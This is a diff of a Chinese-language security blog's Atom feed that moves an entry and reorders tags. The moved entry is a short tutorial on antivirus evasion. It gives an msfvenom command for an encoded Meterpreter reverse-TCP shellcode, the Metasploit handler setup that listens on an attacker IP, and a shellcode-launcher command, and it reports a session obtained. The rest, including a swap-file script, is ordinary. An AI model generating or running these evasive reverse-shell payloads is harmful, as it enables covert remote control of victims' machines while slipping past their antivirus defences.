@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://jaychouzzk.github.io/"/>
-  <updated>2019-08-07T22:41:20.278Z</updated>
+  <updated>2019-08-07T20:54:09.787Z</updated>
   <id>https://jaychouzzk.github.io/</id>
   
   <author>
@@ -15,32 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>msfvenom白加黑免杀.</title>
-    <link href="https://jaychouzzk.github.io/2019/08/08/msfvenom%E7%99%BD%E5%8A%A0%E9%BB%91%E5%85%8D%E6%9D%80./"/>
-    <id>https://jaychouzzk.github.io/2019/08/08/msfvenom白加黑免杀./</id>
-    <published>2019-08-07T16:00:00.000Z</published>
-    <updated>2019-08-07T22:41:20.278Z</updated>
-    
-    <content type="html"><![CDATA[<p>通过一个shellcode加载器，加载我们生成的payload来进行免杀</p><p>shellcode加载器地址：<a href="https://github.com/clinicallyinane/shellcode_launcher" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher</a></p><h2 id="1-msf生成shellcode："><a href="#1-msf生成shellcode：" class="headerlink" title="1.msf生成shellcode："></a>1.msf生成shellcode：</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.2.102 <span class="attribute">lport</span>=6666</span><br><span class="line">-e x86/shikata_ga_nai -i 5 -f<span class="built_in"> raw </span>&gt; /home/k/Desktop/shellcode.bin</span><br></pre></td></tr></table></figure><p>查看下shellcode加载器和我们生成的payload是否免杀</p><p><img src="/img/2019080801.jpg" alt=""></p><p><img src="/img/2019080802.jpg" alt=""></p><h2 id="2-使用shellcode加载我们的payload"><a href="#2-使用shellcode加载我们的payload" class="headerlink" title="2.使用shellcode加载我们的payload:"></a>2.使用shellcode加载我们的payload:</h2><p>服务端先进行监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> use exploit/multi/handler</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> lhost 192.168.2.102</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> lport 6666</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> run</span></span><br></pre></td></tr></table></figure><p><img src="/img/2019080803.jpg" alt=""></p><p>客户端进行加载我们的shellcode</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_launcher<span class="selector-class">.exe</span> -<span class="selector-tag">i</span> shellcode.bin</span><br></pre></td></tr></table></figure><p><img src="/img/2019080804.jpg" alt=""></p><p>成功获取会话</p><p><img src="/img/2019080805.jpg" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;通过一个shellcode加载器，加载我们生成的payload来进行免杀&lt;/p&gt;
-&lt;p&gt;shellcode加载器地址：&lt;a href=&quot;https://github.com/clinicallyinane/shellcode_launcher&quot; target=&quot;_blank
-      
-    
-    </summary>
-    
-    
-      <category term="metasploit" scheme="https://jaychouzzk.github.io/tags/metasploit/"/>
-    
-      <category term="bypass" scheme="https://jaychouzzk.github.io/tags/bypass/"/>
-    
-  </entry>
   
   <entry>
     <title>记一次暗网监控搭建</title>
@@ -73,6 +47,32 @@
   </entry>
   
   <entry>
+    <title>msfvenom白加黑免杀.</title>
+    <link href="https://jaychouzzk.github.io/2019/08/08/msfvenom%E7%99%BD%E5%8A%A0%E9%BB%91%E5%85%8D%E6%9D%80/"/>
+    <id>https://jaychouzzk.github.io/2019/08/08/msfvenom白加黑免杀/</id>
+    <published>2019-08-07T16:00:00.000Z</published>
+    <updated>2019-08-07T22:41:20.278Z</updated>
+    
+    <content type="html"><![CDATA[<p>通过一个shellcode加载器，加载我们生成的payload来进行免杀</p><p>shellcode加载器地址：<a href="https://github.com/clinicallyinane/shellcode_launcher" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher</a></p><h2 id="1-msf生成shellcode："><a href="#1-msf生成shellcode：" class="headerlink" title="1.msf生成shellcode："></a>1.msf生成shellcode：</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.2.102 <span class="attribute">lport</span>=6666</span><br><span class="line">-e x86/shikata_ga_nai -i 5 -f<span class="built_in"> raw </span>&gt; /home/k/Desktop/shellcode.bin</span><br></pre></td></tr></table></figure><p>查看下shellcode加载器和我们生成的payload是否免杀</p><p><img src="/img/2019080801.jpg" alt=""></p><p><img src="/img/2019080802.jpg" alt=""></p><h2 id="2-使用shellcode加载我们的payload"><a href="#2-使用shellcode加载我们的payload" class="headerlink" title="2.使用shellcode加载我们的payload:"></a>2.使用shellcode加载我们的payload:</h2><p>服务端先进行监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> use exploit/multi/handler</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> lhost 192.168.2.102</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> lport 6666</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> run</span></span><br></pre></td></tr></table></figure><p><img src="/img/2019080803.jpg" alt=""></p><p>客户端进行加载我们的shellcode</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_launcher<span class="selector-class">.exe</span> -<span class="selector-tag">i</span> shellcode.bin</span><br></pre></td></tr></table></figure><p><img src="/img/2019080804.jpg" alt=""></p><p>成功获取会话</p><p><img src="/img/2019080805.jpg" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;通过一个shellcode加载器，加载我们生成的payload来进行免杀&lt;/p&gt;
+&lt;p&gt;shellcode加载器地址：&lt;a href=&quot;https://github.com/clinicallyinane/shellcode_launcher&quot; target=&quot;_blank
+      
+    
+    </summary>
+    
+    
+      <category term="metasploit" scheme="https://jaychouzzk.github.io/tags/metasploit/"/>
+    
+      <category term="bypass" scheme="https://jaychouzzk.github.io/tags/bypass/"/>
+    
+  </entry>
+  
+  <entry>
     <title>记一次攻击钓鱼网站服务器</title>
     <link href="https://jaychouzzk.github.io/2019/04/18/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
     <id>https://jaychouzzk.github.io/2019/04/18/记一次攻击钓鱼网站服务器/</id>
@@ -91,11 +91,11 @@
     </summary>
     
     
+      <category term="PHP" scheme="https://jaychouzzk.github.io/tags/PHP/"/>
+    
       <category term="Windows" scheme="https://jaychouzzk.github.io/tags/Windows/"/>
     
       <category term="DedeDMS，Mysql" scheme="https://jaychouzzk.github.io/tags/DedeDMS%EF%BC%8CMysql/"/>
-    
-      <category term="PHP" scheme="https://jaychouzzk.github.io/tags/PHP/"/>
     
       <category term="MSF" scheme="https://jaychouzzk.github.io/tags/MSF/"/>
     
@@ -156,7 +156,7 @@
     <published>2019-03-20T16:00:00.000Z</published>
     <updated>2019-08-07T20:55:35.939Z</updated>
     
-    <content type="html"><![CDATA[<p>有的KVM的VPS初始给的SWAP太小了，比如DigitalOcean就没有分配SWAP，Bandwagon给的才132MB的SWAP，所以需要自行增加SWAP文件。</p><p><code>vim swap.sh</code></p><p>按i键，开启插入模式，插入以下文字。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">echo -e "\033[33m Your current swap is \033[0m"</span><br><span class="line">free -h</span><br><span class="line">mkdir /SwapDir</span><br><span class="line">cd /SwapDir</span><br><span class="line">dd if=/dev/zero of=/SwapDir/swap bs=1M count=512 #这里增加的空间是512MB  </span><br><span class="line">chmod 0600 swap  </span><br><span class="line">mkswap /SwapDir/swap #把这个分区变成swap分区 </span><br><span class="line">swapon /SwapDir/swap #把刚建的swap分区设成为有效状态  </span><br><span class="line">myFile=/etc/fstab.bak   </span><br><span class="line">cd /etc  </span><br><span class="line">if [ -f "$myFile" ];then</span><br><span class="line">rm -rf fstab.bak #删除之前的备份 </span><br><span class="line">else  </span><br><span class="line">cp /etc/fstab /etc/fstab.bak #备份fstab  </span><br><span class="line">fi  </span><br><span class="line">echo "/SwapDir/swap swap swap defaults 0 0"&gt;&gt;/etc/fstab #增加新的swap开机自动启动  </span><br><span class="line">echo -e "\033[31m Done\!Congratulation\！System swap add successful\！ \033[0m"  </span><br><span class="line">echo -e "\033[33m Your system swap is \: \033[0m"</span><br><span class="line">free -h</span><br></pre></td></tr></table></figure><p>Esc，再输入“:wq”，保存退出。</p><p>运行这个脚本，</p><p><code>sh swap.sh</code></p><p>即可增加一个512MB的SWAP文件。文件大小可以自行在脚本中修改，不过一般512MB也足够了。</p><p>转自:<a href="https://www.ljchen.com/archives/1345" target="_blank" rel="noopener">一键增加VPS虚拟内存SWAP</a></p>]]></content>
+    <content type="html"><![CDATA[<p>有的KVM的VPS初始给的SWAP太小了，比如DigitalOcean就没有分配SWAP，Bandwagon给的才132MB的SWAP，所以需要自行增加SWAP文件。</p><p><code>vim swap.sh</code></p><p>按i键，开启插入模式，插入以下文字。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo -e "\033[33m Your current swap is \033[0m"</span><br><span class="line">free -h</span><br><span class="line">mkdir /SwapDir</span><br><span class="line">cd /SwapDir</span><br><span class="line">dd if=/dev/zero of=/SwapDir/swap bs=1M count=512 #这里增加的空间是512MB  </span><br><span class="line">chmod 0600 swap  </span><br><span class="line">mkswap /SwapDir/swap #把这个分区变成swap分区 </span><br><span class="line">swapon /SwapDir/swap #把刚建的swap分区设成为有效状态  </span><br><span class="line">myFile=/etc/fstab.bak   </span><br><span class="line">cd /etc  </span><br><span class="line">if [ -f "$myFile" ];then</span><br><span class="line">rm -rf fstab.bak #删除之前的备份 </span><br><span class="line">else  </span><br><span class="line">cp /etc/fstab /etc/fstab.bak #备份fstab  </span><br><span class="line">fi  </span><br><span class="line">echo "/SwapDir/swap swap swap defaults 0 0"&gt;&gt;/etc/fstab #增加新的swap开机自动启动  </span><br><span class="line">echo -e "\033[31m Done\!Congratulation\！System swap add successful\！ \033[0m"  </span><br><span class="line">echo -e "\033[33m Your system swap is \: \033[0m"</span><br><span class="line">free -h</span><br></pre></td></tr></table></figure><p>Esc，再输入“:wq”，保存退出。</p><p>运行这个脚本，</p><p><code>sh swap.sh</code></p><p>即可增加一个512MB的SWAP文件。文件大小可以自行在脚本中修改，不过一般512MB也足够了。</p><p>转自:<a href="https://www.ljchen.com/archives/1345" target="_blank" rel="noopener">一键增加VPS虚拟内存SWAP</a></p>]]></content>
     
     <summary type="html">
     
